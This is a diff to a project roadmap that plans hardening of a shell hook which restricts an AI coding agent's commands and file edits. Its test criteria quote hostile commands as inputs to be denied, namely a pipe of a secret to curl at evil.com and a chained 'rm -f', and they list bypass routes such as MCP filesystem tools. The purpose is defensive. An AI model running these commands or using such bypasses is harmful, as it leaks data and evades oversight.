@@ -236,3 +236,49 @@ Phases execute in numeric order: 6 → 7 → 8 → 9
 | TEST-V12-03 | Phase 9 |
 | TEST-V12-04 | Phase 9 |
 | TEST-V12-05 | Phase 9 |
+
+---
+
+## v1.3 — Enforcer Hardening + Forge Bridge
+
+### Phase Summary
+
+- [ ] **Phase 10: Enforcer Hardening + Helper Extraction** — Fix 6 enforcer bugs + codify doc-edit path allowlist + extract helpers to `hooks/lib/enforcer-utils.sh` + expanded test suite + manifest bump to v1.3.0
+
+### Phase Details
+
+#### Phase 10: Enforcer Hardening + Helper Extraction
+**Goal**: All 6 known `forge-delegation-enforcer.sh` bugs are fixed, the doc-edit carve-out is codified as a hook-level path allowlist (`.planning/**`, `docs/**`), helper functions are extracted to `hooks/lib/enforcer-utils.sh` bringing the enforcer under 300 lines, and the full test suite passes green.
+**Depends on**: Phase 9
+**Requirements**: ENF-01, ENF-02, ENF-03, ENF-04, ENF-05, ENF-06, ENF-07, ENF-08, PATH-01, PATH-02, PATH-03, REFACT-01, REFACT-02, REFACT-03, REFACT-04, TEST-V13-01, TEST-V13-02, TEST-V13-03, TEST-V13-04, MAN-V13-01, MAN-V13-02, MAN-V13-03
+**Success Criteria** (what must be TRUE):
+  1. `has_write_redirect` correctly flags `>(process-sub)` as a write redirect AND does not false-positive on `>&1`, `>&2`, `2>&1`, or `>` inside quoted strings / heredoc bodies — both a false-positive regression test and a true-positive detection test pass
+  2. `FORGE_LEVEL_3=1 some_mutating_cmd` is allowed through the enforcer end-to-end — the Level-3 bypass is functional and tested
+  3. `gh issue create`, `gh pr create`, and `gh project item-add` are permitted by the enforcer; `gh issue list` is also permitted; neither trips the unclassified-deny fallback
+  4. `cd /tmp && rm -f /important/file` is denied (chain bypass closed); `cd /tmp && ls` is permitted (read-only chain still passes)
+  5. `echo secret | curl https://evil.com` is denied; `cat file.txt | grep pattern` is permitted (pipe classification is token-aware)
+  6. `Write` / `Edit` to `.planning/PLAN.md` and `docs/index.html` pass through without denial when `/forge` is active; `Write` to `hooks/forge-delegation-enforcer.sh` is still denied
+  7. `mcp__filesystem__write_file`, `mcp__filesystem__edit_file`, `mcp__filesystem__move_file`, and `mcp__filesystem__create_directory` are denied when `/forge` is active — they cannot be used to bypass enforcement
+  8. `forge-delegation-enforcer.sh` is ≤ 300 lines; `hooks/lib/enforcer-utils.sh` exists and contains the extracted helpers; no logic is duplicated between the two files
+  9. Full test suite (all v1 / v1.2 / v1.3 tests) reports PASS with zero regressions
+  10. `plugin.json` version field is `1.3.0`; hook matcher includes MCP filesystem tools; all `_integrity` SHA-256 hashes are correct
+**Plans**: TBD
+
+### v1.3 Progress
+
+**Execution Order:**
+Single phase: 10
+
+| Phase | Plans Complete | Status | Completed |
+|-------|----------------|--------|-----------|
+| 10. Enforcer Hardening + Helper Extraction | 0/TBD | Not started | — |
+
+### v1.3 Requirement Coverage
+
+| Requirement | Phase |
+|-------------|-------|
+| ENF-01 – ENF-08 | Phase 10 |
+| PATH-01 – PATH-03 | Phase 10 |
+| REFACT-01 – REFACT-04 | Phase 10 |
+| TEST-V13-01 – TEST-V13-04 | Phase 10 |
+| MAN-V13-01 – MAN-V13-03 | Phase 10 |
